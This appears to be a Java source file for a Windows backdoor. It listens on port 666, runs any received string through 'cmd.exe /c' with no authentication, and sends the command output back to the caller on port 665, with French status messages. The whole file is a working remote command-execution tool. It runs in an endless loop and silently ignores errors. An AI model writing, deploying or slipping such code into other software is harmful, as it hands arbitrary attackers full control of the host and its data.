import java.io.*;
import java.net.*;
import java.util.concurrent.TimeUnit;

public class Receive_Nor {

    public static boolean sentData = false;

    public static void main(final String[] args) {

        while (true) {

            try {

                final ServerSocket serverSocket = new ServerSocket(666);

                sentData = false;

                final Socket clientSocket = serverSocket.accept();
                final InputStream inputStream = clientSocket.getInputStream();
                final DataInputStream dataInputStream = new DataInputStream(inputStream);

                final Process proc = Runtime.getRuntime().exec("cmd.exe /c " + dataInputStream.readUTF(), null, new File("C:"));

                proc.waitFor(30, TimeUnit.SECONDS);

                final Thread returnData = new Thread(() -> {

                    try {

                        final BufferedReader stdInput = new BufferedReader(new
                                InputStreamReader(proc.getInputStream()));

                        final BufferedReader stdError = new BufferedReader(new
                                InputStreamReader(proc.getErrorStream()));

                        String s = null;

                        final StringBuilder output = new StringBuilder();
                        while ((s = stdInput.readLine()) != null) {
                            output.append(s).append("\n");
                        }

                        final StringBuilder error = new StringBuilder();
                        while ((s = stdError.readLine()) != null) {
                            error.append(s).append("\n");
                        }

                        if (output.length() == 0 && error.length() == 0) {
                            returnOutput(null, null, "NO_DATA", clientSocket);
                        } else returnOutput(output.toString(), error.toString(), null, clientSocket);
                    } catch (final IOException ignored) {}
                });

                returnData.start();
                returnData.join(1000);

                if (!sentData) returnOutput(null, null, "TIMED_OUT", clientSocket);

                serverSocket.close();

            } catch (final IOException | InterruptedException ignored) {}
        }
    }

    public static void returnOutput(final String output, final String error, final String reason, final Socket clientSocket) throws IOException {
        final Socket socket = new Socket(clientSocket.getInetAddress(), 665);

        final OutputStream outputStream = socket.getOutputStream();
        final DataOutputStream dataOutputStream = new DataOutputStream(outputStream);

        String out = "", outError = "";

        if (output != null && !output.isEmpty()) {
            out = "============================== Donnée ==============================" + "\n" + output + "\n" + "====================================================================";
        }

        if (error != null && !error.isEmpty()) {
            outError = "============================== Erreur ==============================" + "\n" + error + "\n" + "====================================================================";
        }

        dataOutputStream.writeUTF(!out.isEmpty() || !outError.isEmpty() ? out + outError : "\033[0;31m" + "[A <-x-> V]" + "\033[0m" + " La connexion a était terminé sans données ou erreur. (" + reason + ")");
        dataOutputStream.flush();
        outputStream.flush();
        dataOutputStream.close();
        outputStream.close();

        sentData = true;
        socket.close();
    }
}
